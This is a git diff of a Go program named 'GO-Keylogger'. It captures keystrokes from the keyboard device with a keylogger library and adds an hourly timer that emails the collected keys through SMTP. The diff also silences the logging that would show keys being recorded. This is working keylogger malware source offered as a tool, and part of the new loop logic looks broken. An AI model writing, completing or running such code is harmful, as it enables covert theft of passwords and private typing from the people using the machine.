@@ -1,28 +1,43 @@
 package main
 
 import (
-	"fmt"
+	_ "fmt"
 	"net/smtp"
 	"strings"
+	"time"
 
 	"github.com/MarinX/keylogger"
 	log "github.com/sirupsen/logrus"
 )
 
-// TODO:
-//		1. Read Keyboard ---- X
-//		2. Send to mail  ---- O
-
 var pressed_keys []string
 
 func main() {
-	log.Println("Welcome")
+	log.Println("GO-Keylogger")
 
-	readKeyboard()
-	fmt.Println(pressed_keys)
+	x := true
+	t0 := time.Duration(3600) * time.Second // 1 hour
+Loop:
+	for x {
+		y := false
+		readKeyboard()
 
-	fmt.Println("Message:")
-	send()
+		timer := time.AfterFunc(t0, func() {
+			log.Println("Sending email")
+			// fmt.Println(pressed_keys)
+			// bodyString := strings.Join(pressed_keys[:], " ")
+			// log.Println(bodyString)
+			send()
+			y = true
+		})
+
+		defer timer.Stop()
+
+		if y {
+			continue Loop
+		}
+
+	}
 
 }
 
@@ -33,11 +48,13 @@ func readKeyboard() {
 		return
 	}
 
-	log.Println("Found a Keyboard at", keyboard)
+	// log.Println("Found a Keyboard at", keyboard)
 
 	k, err := keylogger.New(keyboard)
 	check(err)
 	defer k.Close()
+
+	oldLen := len(pressed_keys)
 
 	events := k.Read()
 
@@ -47,7 +64,7 @@ func readKeyboard() {
 		case keylogger.EvKey:
 			// if the state of key is pressed
 			if e.KeyPress() {
-				log.Println("[event] press key ", e.KeyString())
+				// log.Println("[event] press key ", e.KeyString())
 				pressed_keys = append(pressed_keys, e.KeyString())
 			}
 
@@ -58,7 +75,7 @@ func readKeyboard() {
 			// }
 
 		}
-		if len(pressed_keys) >= 20 {
+		if len(pressed_keys) >= oldLen+3 { // Append each 3 letters
 			break
 		}
 	}
